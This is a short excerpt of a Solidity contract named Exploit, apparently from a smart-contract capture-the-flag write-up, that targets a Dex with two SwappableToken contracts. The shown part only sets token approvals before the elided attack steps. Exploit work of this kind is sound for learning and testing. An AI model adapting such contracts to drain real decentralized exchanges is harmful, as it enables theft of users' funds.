...
contract Exploit {
    Dex dex;
    SwappableToken token1 = SwappableToken(0xA19b214e3578dED0593056750Acff82341a79f97);
    SwappableToken token2 = SwappableToken(0x20DAc69801Bde251F425646b80B74EBf41FccaF1);
    ...
    function exploit() public {
      ...
      token1.approve(msg.sender, address(this), 10000);
      token2.approve(msg.sender, address(this), 10000);
